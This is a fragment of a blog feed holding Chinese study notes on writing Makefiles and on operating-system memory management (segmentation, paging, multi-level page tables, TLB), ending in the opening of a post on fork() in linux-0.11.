hello.c</span><br></pre></td></tr></table></figure><p>基本原则：</p><ol><li>若想生成<strong>目标</strong>，检查<strong>规则</strong>中的<strong>依赖条件</strong>是否存在，如不存在，则寻找是否有<strong>规则</strong>用来生成该<strong>依赖条件</strong></li><li>检查规则中的<strong>目标</strong>是否需要更新，必须先检查它的所有<strong>依赖</strong>，<strong>依赖</strong>中有任意一个被更新，则<strong>目标</strong>才能更新<ul><li>分析各个目标和依赖之间的关系</li><li>根据依赖关系自底向上执行命令</li><li>根据<strong>依赖条件</strong>和<strong>目标</strong>的修改时间来判断<strong>目标</strong>是否需要更新</li><li>如果目标不依赖任何条件，则执行对应命令，以示更新</li></ul></li><li><code>make</code>工具检查<code>makefile</code>文件，默认将其中第1条规则的目标作为<strong>终极目标</strong><br> 除非用 <code>ALL</code> 命令指定终极目标<br> <code>make</code>生成<strong>终极目标</strong>就自动退出了</li></ol><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">ALL: main</span></span><br><span class="line"><span class="section">hello.o: hello.c</span></span><br><span class="line">     gcc -c hello.c -o hello.o</span><br><span class="line"><span class="section">add.o: add.c</span></span><br><span class="line">     gcc -c add.c -o add.o</span><br><span class="line"><span class="section">sub.o: sub.c</span></span><br><span class="line">     gcc -c sub.c -o sub.o</span><br><span class="line"><span class="section">div.o: div.c</span></span><br><span class="line">     gcc -c div.c -o div.o</span><br><span class="line"><span class="section">main: hello.o add.o sub.o div.o</span></span><br><span class="line">     gcc hello.o add.o sub.o div.o -o main </span><br></pre></td></tr></table></figure><h2 id="2个函数"><a href="#2个函数" class="headerlink" title="2个函数"></a>2个函数</h2><h3 id="wildcard-c"><a href="#wildcard-c" class="headerlink" title="$(wildcard *.c)"></a>$(wildcard *.c)</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src = <span class="variable">$(<span class="built_in">wildcard</span> *.c)</span> <span class="comment"># src = hello.c add.c sub.c div.c</span></span><br></pre></td></tr></table></figure><p>匹配当前工作目录下所有<code>.c</code>文件。将文件名组成列表，赋值给变量 src</p><h3 id="patsubst-c-o-src"><a href="#patsubst-c-o-src" class="headerlink" title="$(patsubst %.c, %.o,$(src))"></a>$(patsubst %.c, %.o,$(src))</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj = <span class="variable">$(<span class="built_in">patsubst</span> %.c, %.o,<span class="variable">$(src)</span>)</span> <span class="comment"># obj = hello.o add.o sub.o div.o</span></span><br></pre></td></tr></table></figure><p>将变量<strong>参数3</strong>中包含<strong>参数1</strong>的部分替换为<strong>参数2</strong>，并赋值给变量 <code>obj</code></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">src = <span class="variable">$(<span class="built_in">wildcard</span> *.c)</span></span><br><span class="line">obj = <span class="variable">$(<span class="built_in">patsubst</span> %.c, %.o, <span class="variable">$(src)</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="section">ALL: main</span></span><br><span class="line"></span><br><span class="line"><span class="section">main: <span class="variable">$(obj)</span></span></span><br><span class="line">gcc hello.o add.o sub.o div.o -o main </span><br><span class="line"><span class="section">hello.o: hello.c</span></span><br><span class="line">gcc -c hello.c -o hello.o</span><br><span class="line"><span class="section">add.o: add.c</span></span><br><span class="line">gcc -c add.c -o add.o</span><br><span class="line"><span class="section">sub.o: sub.c</span></span><br><span class="line">gcc -c sub.c -o sub.o</span><br><span class="line"><span class="section">div.o: div.c</span></span><br><span class="line">gcc -c div.c -o div.o</span><br></pre></td></tr></table></figure><h3 id="clean"><a href="#clean" class="headerlink" title="clean"></a>clean</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">clean: (没有依赖)</span></span><br><span class="line">-rm -rf <span class="variable">$(obj)</span> main <span class="comment"># rm前的&#x27;-&#x27;作用是删除不存在文件时不报错，继续执行</span></span><br></pre></td></tr></table></figure><h2 id="3个自动变量"><a href="#3个自动变量" class="headerlink" title="3个自动变量"></a>3个自动变量</h2><table><thead><tr><th align="center">自动变量</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">$@</td><td align="center">在规则的命令中，表示规则中的目标</td></tr><tr><td align="center">$&lt;</td><td align="center">在规则的命令中，表示规则中的第一个依赖条件</td></tr><tr><td align="center">$^</td><td align="center">在规则的命令中，表示规则中的所有依赖条件，组成一个列表，用空格隔开，删除重复项</td></tr></tbody></table><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">src = <span class="variable">$(<span class="built_in">wildcard</span> *.c)</span></span><br><span class="line">obj = <span class="variable">$(<span class="built_in">patsubst</span> %.c, %.o, <span class="variable">$(src)</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="section">ALL: main</span></span><br><span class="line"></span><br><span class="line"><span class="section">main: <span class="variable">$(obj)</span></span></span><br><span class="line">gcc <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">hello.o: hello.c</span></span><br><span class="line">gcc -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">add.o: add.c</span></span><br><span class="line">gcc -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">sub.o: sub.c</span></span><br><span class="line">gcc -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">div.o: div.c</span></span><br><span class="line">gcc -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">-rm -rf <span class="variable">$(obj)</span> main</span><br></pre></td></tr></table></figure><h2 id="模式规则"><a href="#模式规则" class="headerlink" title="模式规则"></a>模式规则</h2><p>将上面一组相似的规则定义了一个模式</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">%.o: %.c</span></span><br><span class="line">gcc -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">src = <span class="variable">$(<span class="built_in">wildcard</span> *.c)</span></span><br><span class="line">obj = <span class="variable">$(<span class="built_in">patsubst</span> %.c, %.o, <span class="variable">$(src)</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="section">ALL: main</span></span><br><span class="line"></span><br><span class="line"><span class="section">main: <span class="variable">$(obj)</span></span></span><br><span class="line">gcc <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o: %.c</span></span><br><span class="line">gcc -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">-rm -rf <span class="variable">$(obj)</span> main</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">make</span></span><br><span class="line">gcc -c hello.c -o hello.o</span><br><span class="line">gcc -c add.c -o add.o</span><br><span class="line">gcc -c div.c -o div.o</span><br><span class="line">gcc -c sub.c -o sub.o</span><br><span class="line">gcc hello.o add.o div.o sub.o -o main</span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br></pre></td></tr></table></figure><p>这样可以随意的添加或删除一些源文件而不需要去动<code>makefile</code></p><h2 id="静态模式规则"><a href="#静态模式规则" class="headerlink" title="静态模式规则"></a>静态模式规则</h2><p>给一个变量指定了一个模式规则</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">src = <span class="variable">$(<span class="built_in">wildcard</span> *.c)</span></span><br><span class="line">obj = <span class="variable">$(<span class="built_in">patsubst</span> %.c, %.o, <span class="variable">$(src)</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="section">ALL: main</span></span><br><span class="line"></span><br><span class="line"><span class="section">main: <span class="variable">$(obj)</span></span></span><br><span class="line">gcc <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(obj)</span>: %.o: %.c</span><br><span class="line">gcc -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o: %.c</span></span><br><span class="line">gcc -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">-rm -rf <span class="variable">$(obj)</span> main</span><br></pre></td></tr></table></figure><h2 id="伪目标"><a href="#伪目标" class="headerlink" title="伪目标"></a>伪目标</h2><p>不管目标文件是否是最新的，都再去执行一次<strong>目标</strong>的<strong>规则</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">-rm -rf <span class="variable">$(obj)</span> main</span><br></pre></td></tr></table></figure><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>还可以用变量去定义一些在命令中会用到的参数</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">src = <span class="variable">$(<span class="built_in">wildcard</span> *.c)</span></span><br><span class="line">obj = <span class="variable">$(<span class="built_in">patsubst</span> %.c, %.o, <span class="variable">$(src)</span>)</span></span><br><span class="line"></span><br><span class="line">FLAGS = -Wall -g</span><br><span class="line"></span><br><span class="line"><span class="section">ALL: main</span></span><br><span class="line"></span><br><span class="line"><span class="section">main: <span class="variable">$(obj)</span></span></span><br><span class="line">gcc <span class="variable">$^</span> -o <span class="variable">$@</span> <span class="variable">$(FLAGS)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(obj)</span>: %.o: %.c</span><br><span class="line">gcc -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span> <span class="variable">$(FLAGS)</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">-rm -rf <span class="variable">$(obj)</span> main</span><br></pre></td></tr></table></figure><h2 id="小测试"><a href="#小测试" class="headerlink" title="小测试"></a>小测试</h2><p>小测试的项目结构</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">maketest</span><br><span class="line">├── include</span><br><span class="line">│   └── head.h</span><br><span class="line">├── Makefile</span><br><span class="line">├── obj</span><br><span class="line">└── src</span><br><span class="line">    ├── add.c</span><br><span class="line">    ├── div.c</span><br><span class="line">    ├── main.c</span><br><span class="line">    └── sub.c</span><br><span class="line"></span><br><span class="line">3 directories, 6 files</span><br></pre></td></tr></table></figure><p><code>Makefile</code>文件内容</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">src = <span class="variable">$(<span class="built_in">wildcard</span> ./src/*.c)</span></span><br><span class="line">obj = <span class="variable">$(<span class="built_in">patsubst</span> ./src/%.c, ./obj/%.o, <span class="variable">$(src)</span>)</span></span><br><span class="line"></span><br><span class="line">INCLUDE_PATH = ./<span class="keyword">include</span></span><br><span class="line"></span><br><span class="line"><span class="section">ALL: main</span></span><br><span class="line"></span><br><span class="line"><span class="section">main: <span class="variable">$(obj)</span> # 链接阶段就不需要include了</span></span><br><span class="line">gcc <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(obj)</span>: ./obj/%.o: ./src/%.c <span class="comment"># 编译阶段需要include</span></span><br><span class="line">gcc -c <span class="variable">$&lt;</span> -I <span class="variable">$(INCLUDE_PATH)</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">-rm -rf <span class="variable">$(obj)</span> main</span><br></pre></td></tr></table></figure><p><code>main.c</code>文件内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;head.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">10</span>, b = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d+%d=%d\n&quot;</span>, a, b, add(a, b));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d-%d=%d\n&quot;</span>, a, b, sub(a, b));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d/%d=%d\n&quot;</span>, a, b, div(a, b));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>head.h</code>文件内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _HEAD_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _HEAD_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">div</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">make</span></span><br><span class="line">gcc -c src/main.c -I ./include -o obj/main.o</span><br><span class="line">gcc -c src/add.c -I ./include -o obj/add.o</span><br><span class="line">gcc -c src/div.c -I ./include -o obj/div.o</span><br><span class="line">gcc -c src/sub.c -I ./include -o obj/sub.o</span><br><span class="line">gcc obj/main.o obj/add.o obj/div.o obj/sub.o -o main</span><br></pre></td></tr></table></figure><p>最终执行项目结构图</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">maketest</span><br><span class="line">├── include</span><br><span class="line">│   └── head.h</span><br><span class="line">├── main</span><br><span class="line">├── Makefile</span><br><span class="line">├── obj</span><br><span class="line">│   ├── add.o</span><br><span class="line">│   ├── div.o</span><br><span class="line">│   ├── main.o</span><br><span class="line">│   └── sub.o</span><br><span class="line">└── src</span><br><span class="line">    ├── add.c</span><br><span class="line">    ├── div.c</span><br><span class="line">    ├── main.c</span><br><span class="line">    └── sub.c</span><br><span class="line"></span><br><span class="line">3 directories, 11 files</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【哈工大操作系统】内存实现</title>
      <link href="/2024/05/16/%E3%80%90%E5%93%88%E5%B7%A5%E5%A4%A7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%91%E5%86%85%E5%AD%98%E5%AE%9E%E7%8E%B0/"/>
      <url>/2024/05/16/%E3%80%90%E5%93%88%E5%B7%A5%E5%A4%A7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%91%E5%86%85%E5%AD%98%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p><strong>一个地址指向一个字节</strong></p><p><strong>重定位</strong>：修改程序(静态代码)中的地址(相对地址)</p><p>程序每次运行时，在内存中的地址都是不一样的，所以我们不可能直接使用固定的地址。</p><p>在程序中出现的地址叫做<strong>偏移地址</strong>(相对地址)，它是相对于程序第一条指令的偏移地址。所以只要确定了程序第一条指令在内存中的具体地址，就能确定程序中的所有地址。而程序第一条指令的地址就叫做<strong>基地址</strong>(base)，<code>CPU</code>在处理程序的地址时只需要将<strong>基地址</strong>和<strong>偏移地址</strong>相加就可以得到在内存中的物理地址，得到物理地址的过程叫做<strong>地址翻译</strong></p><p>由于程序的代码会在内存和硬盘中来回交换，所以每次程序的基地址都会发生变化，而这种变化都会记录在<code>PCB</code>中，就是说<code>PCB</code>会记录程序的基地址。每次翻译时都会从<code>PCB</code>找到这个基址</p><h3 id="内存的使用与代码分段"><a href="#内存的使用与代码分段" class="headerlink" title="内存的使用与代码分段"></a>内存的使用与代码分段</h3><p>为了提高程序和内存的效率，代码会进行分段：<code>代码段</code>、<code>数据段</code>、<code>栈段</code>等等</p><p>写汇编时也是这样使用地址的，比如 <code>mov ax, ds:[100]</code></p><p>程序载入内存时，各个段会被分割开存入，离散的放入内存中，所以就需要记录每个段的起始地址，或者说基址。</p><p>每一个段都会有一个编号(0、1、2….)，比如说CS&#x3D;0，DS&#x3D;1….</p><p>这样就形成了一个表，用来描述各个段。即<strong>进程段表</strong>或者说 <strong>LDT</strong> ，存储在<code>PCB</code>中</p><table><thead><tr><th align="center">段号</th><th align="center">基址</th><th align="center">长度</th><th align="center">保护</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">180K</td><td align="center">150K</td><td align="center">R</td></tr><tr><td align="center">1</td><td align="center">360K</td><td align="center">60K</td><td align="center">R&#x2F;W</td></tr><tr><td align="center">2</td><td align="center">70K</td><td align="center">110K</td><td align="center">R&#x2F;W</td></tr><tr><td align="center">3</td><td align="center">460K</td><td align="center">40K</td><td align="center">R</td></tr></tbody></table><h3 id="内存分区和分页"><a href="#内存分区和分页" class="headerlink" title="内存分区和分页"></a>内存分区和分页</h3><p>操作系统管理内存，可以将内存分为多个大小不等的区域，用一个数据结构表去记录空闲分区的信息，比如(基址和长度)。然后如果有一个进程需要申请内存空间，操作系统只需要遍历这个表找到对应的空间然后返回地址即可。</p><p>如此，因为不同的程序大小不等，且在内存中都是离散分布的，这就造成了<strong>内存碎片</strong>，使得内存浪费</p><p>内存碎片虽然可以将各个段移动让它们更加密集，但是这相当的浪费时间</p><p>这就引出了分页</p><ul><li>将面包切成片，将内存分成页</li><li>针对每个段内存请求，系统一页一页的分配这个段</li></ul><p>所谓<strong>页</strong>，其实就是将一个<strong>段</strong>打散，分为若干页，向上取整，也就是说页是段的组成单位。而一个页大小为<code>4K</code>，这样一个段最多浪费4K的内存，还是很有性价比的</p><p>每个段都会有若干页，每个页又是离散的存储在内存中的，这样就需要个表来记录这些页的信息。内存就这样被分成了好多好多的页</p><p>这个记录页的信息的表就叫做<strong>页表</strong>，<code>CPU</code>的<code>cr3</code>寄存器会指向它</p><table><thead><tr><th align="center">页号</th><th align="center">页框号</th><th align="center">保护</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">5</td><td align="center">R</td></tr><tr><td align="center">1</td><td align="center">1</td><td align="center">R&#x2F;W</td></tr><tr><td align="center">2</td><td align="center">3</td><td align="center">R&#x2F;W</td></tr><tr><td align="center">3</td><td align="center">6</td><td align="center">R</td></tr></tbody></table><p>当我们执行某条指令比如：<code>mov ax, [0x2240]</code>时，<code>CPU</code>是这样找地址为<code>[0x2240]</code>这个内存单元的</p><p>首先，页的大小是<code>4K</code>，那么用<code>0x2240 / 4*2^10</code>，右移3位得出这个内存单元所在页号<code>2</code>，然后通过页表查找该页号对应的页框号<code>3</code>，页号是由代码段按顺序分的，页框号是内存从小到大排的。然后<code>3 * 4K</code>得出这个页框的基址，左移3位得<code>0x3000</code>加上偏移地址<code>0x0240</code>得最终物理地址<code>0x3240</code></p><h3 id="多级页表与快表"><a href="#多级页表与快表" class="headerlink" title="多级页表与快表"></a>多级页表与快表</h3><p>但是接下来又引出了一个问题，假如在一个<code>32位处理机</code>上，一个程序所能表示的地址最多就是<code>4G</code>，假如一个页的大小为<code>4K</code>那么一个程序就需要<code>4G / 4K = 1M</code>个页表项，一个页表项一般是<code>4 byte</code>，这样一个程序的页表就需要<code>4M</code>。一个处理机上不可能只运行一个程序，这样的话内存中光是页表的开销就很大了。</p><p>于是有了第一个想法，能不能将程序中用不到的页对应的页表项去掉，只保留程序中会用到的页的页表项。这样就会导致页表项的页号是不连续的，虽然是有顺序的。但这样还是需要用查找算法去查找页表项，这个操作是涉及内存操作的，这样的话一条指令除了本身需要的一次内存操作还需要额外多好几次内存操作，性能大打折扣。显然只存放用到的页这个想法是不合适的。所以页表项必须是连续的。</p><p>减少不必要的页表项是减少内存占用的唯一办法。但是某种程度上，又要求页表项必须是连续的。</p><p>将二者结合起来，便有了<strong>多级页表</strong>。</p><p>多级页表就是将几个页项分为一组，组成几个单独的<strong>页表</strong>，又称页目录，由<strong>页目录项</strong>指向这些页表。这些页目录项组成<strong>页目录表</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   10bits     10bits      12bits</span><br><span class="line">+----------+----------+------------+</span><br><span class="line">| 页目录号  |   页号   |   Offset   |</span><br><span class="line">+----------+----------+------------+</span><br></pre></td></tr></table></figure><p>页目录项就好比 <strong>章</strong>，页表项就好比 <strong>节</strong>，一个页目录项指向一个页表，就好比一个章指向一片连续的节；一个页表项指向一页的具体地址，就好比一个节指向一页的具体页数。</p><p>用多级页表这种方式，虽然页目录因为要满足连续性，必须是<code>4KB</code>大小不可避免。但是有些连续的页表项是用不到的，将这些页表项组成的页表去掉，就省下了大批空间，然后令页目录项置为<code>NULL</code>就行了。但是，如果某块页表中尽管只有一个页表项有用到，为了满足连续性，仍然需要<code>4KB</code>的大小去组成页表，即使有99%的页表项是<code>NULL</code>。</p><p>需要注意的是，每多加一级页表，能够减少一次内存浪费，但同时会增加一次内存访问。</p><p>所以设置几级页表，这也是需要考虑的。</p><p>对于一条需要访问内存的指令，访问一次内存这是不可避免的。但是由于内存碎片的存在，需要将段打散分成页离散存储在内存中，于是需要一个页表去维护逻辑页号与页框的关系，这就额外产生了一次内存访问。因为页表过于占内存，需要将页表打散分成页目录，于是需要一个页目录表去维护页表号与页表的关系，这样又额外产生了一次内存访问。</p><p>因为只访问一次就能得出地址这个条件太诱人了，难以舍弃。于是又有了<strong>快表</strong>(<strong>TLB</strong>)。</p><p>快表是一级页表，并不存在内存中，它作为寄存器嵌在<code>CPU</code>中，快表中的页号并不是连续的，但是可以设计一种电路，用硬件的方式只用一次比对就可以直接得出想要的页表项。虽然这个想法很好，但是硬件的造假是很昂贵的，所以快表中页表项的数量不能太多。这就需要一个交换算法，以提高快表的命中率。即使未命中也无非是回到多级页表中重找一次，这并不太亏。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">        20bits           12bits</span><br><span class="line">+--------------------+------------+</span><br><span class="line">|        页号        |   Offset   |</span><br><span class="line">+--------------------+------------+</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">有效</th><th align="center">页号</th><th align="center">修改</th><th align="center">保护</th><th align="center">页框号</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">140</td><td align="center">0</td><td align="center">R</td><td align="center">56</td></tr><tr><td align="center">1</td><td align="center">20</td><td align="center">1</td><td align="center">R&#x2F;W</td><td align="center">23</td></tr><tr><td align="center">0</td><td align="center">19</td><td align="center">0</td><td align="center">R&#x2F;X</td><td align="center">29</td></tr><tr><td align="center">1</td><td align="center">21</td><td align="center">0</td><td align="center">R</td><td align="center">43</td></tr></tbody></table><p>将多级页表和快表两种方式结合起来，既提高了空间利用率，又加快了地址翻译的时间。（与极端的方法对比</p><h3 id="段页结合的实际内存管理"><a href="#段页结合的实际内存管理" class="headerlink" title="段页结合的实际内存管理"></a>段页结合的实际内存管理</h3><p>对于用户来说，将程序以段的形式载入内存是更具逻辑的方式；但是对于内存来说，将程序以页的方式载入内存是最能提高内存利用率的方式。显然这两种方式是有冲突的。</p><p>###内存的换入</p>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【哈工大操作系统】fork()到底发生了什么</title>
      <link href="/2024/05/12/%E3%80%90%E5%93%88%E5%B7%A5%E5%A4%A7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%91fork()%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/"/>
      <url>/2024/05/12/%E3%80%90%E5%93%88%E5%B7%A5%E5%A4%A7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%91fork()%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/</url>
      
        <content type="html"><![CDATA[<p><code>fork()</code>函数起源于<code>linux-0.11</code>下的<code>main()</code>函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// linux-0.11/init/main.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> _syscall0(<span class="type">int</span>,fork)</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        init();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(;;) pause();</span><br><span 